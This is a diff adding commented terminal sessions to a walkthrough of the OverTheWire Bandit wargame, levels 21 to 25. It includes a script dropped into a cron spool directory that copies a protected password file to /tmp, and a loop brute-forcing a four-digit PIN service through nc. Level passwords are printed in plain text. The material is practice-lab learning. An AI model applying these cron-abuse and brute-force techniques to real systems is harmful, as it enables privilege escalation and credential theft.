@@ -1,4 +1,5 @@
 # Terminal outputs are commented. Last line of every section is the password for the next level
+# ssh bandit[]@bandit.labs.overthewire.org -p 2220 
 
 #
 #   0   --------------------
@@ -898,4 +899,169 @@ bandit20@bandit:~$ ./suconnect 1111
 
 #
 #   21  --------------------
+#
+
+bandit21@bandit:~$ ls /etc/cron.d/
+# cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24
+# cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root
+bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit15_root
+# * * * * * root /usr/bin/cronjob_bandit15_root.sh &> /dev/null
+bandit21@bandit:~$ cat /usr/bin/cronjob_bandit15_root.sh
+# cat: /usr/bin/cronjob_bandit15_root.sh: Permission denied
+bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit17_root
+# * * * * * root /usr/bin/cronjob_bandit17_root.sh &> /dev/null
+bandit21@bandit:~$ cat /usr/bin/cronjob_bandit17_root.sh
+# cat: /usr/bin/cronjob_bandit17_root.sh: Permission denied
+bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
+# @reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+# * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
+#!/bin/bash
+# chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+# cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+# Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+#
+#   22  --------------------
+#
+
+bandit22@bandit:~$ ls /etc/cron.d/
+# cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24
+# cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root
+bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
+# @reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+# * * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+
+# myname=$(whoami)
+# mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+# echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+# cat /etc/bandit_pass/$myname > /tmp/$mytarget
+bandit22@bandit:~$ /usr/bin/cronjob_bandit23.sh
+# Copying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3
+bandit22@bandit:~$ cat /tmp/8169b67bd894ddbb4412f91573b38db3
+# Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+#
+#   23  --------------------
+#
+
+bandit22@bandit:~$ ls /etc/cron.d/
+# cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24
+# cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root
+bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
+# @reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+# * * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+
+# myname=$(whoami)
+# mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+# echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+# cat /etc/bandit_pass/$myname > /tmp/$mytarget
+bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+# 8ca319486bfbbc3663ea0fbe81326349
+bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+# jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+#
+#   24  --------------------
+#
+
+bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
+# @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+# * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+# myname=$(whoami)
+
+# cd /var/spool/$myname
+# echo "Executing and deleting all scripts in /var/spool/$myname:"
+# for i in * .*;
+# do
+    # if [ "$i" != "." -a "$i" != ".." ];
+    # then
+        # echo "Handling $i"
+        # owner="$(stat --format "%U" ./$i)"
+        # if [ "${owner}" = "bandit23" ]; then
+            # timeout -s 9 60 ./$i
+        # fi
+        # rm -f ./$i
+    # fi
+# done
+
+bandit23@bandit:~$ cd /tmp
+bandit23@bandit:/tmp$ mkdir tydir
+bandit23@bandit:/tmp$ cd tydir
+bandit23@bandit:/tmp/tydir$ touch catpass.sh
+bandit23@bandit:/tmp/tydir$ touch pass.txt
+bandit23@bandit:/tmp/tydir$ chmod 777 catpass.sh
+bandit23@bandit:/tmp/tydir$ chmod 777 pass.txt
+bandit23@bandit:/tmp/tydir$ ls -l
+# total 0
+# -rwxrwxrwx 1 bandit23 root 0 Jan  2 02:34 catpass.sh
+# -rwxrwxrwx 1 bandit23 root 0 Jan  2 02:34 pass.txt
+bandit23@bandit:/tmp/tydir$ nano catpass.sh
+# Unable to create directory /home/bandit23/.nano: Permission denied
+# It is required for saving/loading search history or cursor positions.
+
+# Press Enter to continue
+
+#  ------ catpass.sh --------------------------------
+
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/tydir/pass.txt
+
+#  -------------------------------------------------
+
+bandit23@bandit:/tmp/tydir$ cp catpass.sh /var/spool/bandit24/
+bandit23@bandit:/tmp/tydir$ cat pass.txt
+# UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+#
+#   24  --------------------
+#
+
+bandit24@bandit:~$ cd /tmp/tysdir
+bandit24@bandit:/tmp/tysdir$ touch guess.sh
+bandit24@bandit:/tmp/tysdir$ chmod a+x guess.sh
+bandit24@bandit:/tmp/tysdir$ nano guess.sh
+# Unable to create directory /home/bandit24/.nano: Permission denied
+# It is required for saving/loading search history or cursor positions.
+
+# Press Enter to continue
+
+#  -------- guess.sh --------------------------------
+
+#!/bin/bash
+
+prevpass=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+for i in {0000..9999}; do
+	echo "$prevpass $i"
+done | nc localhost 30002
+
+#  --------------------------------------------------
+
+bandit24@bandit:/tmp/tysdir$ ./guess.sh
+# Wrong! Please enter the correct pincode. Try again.
+# .
+# .
+# .
+# Wrong! Please enter the correct pincode. Try again.
+# Correct!
+# The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+# Exiting.
+# uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+#
+#   25  --------------------
 #
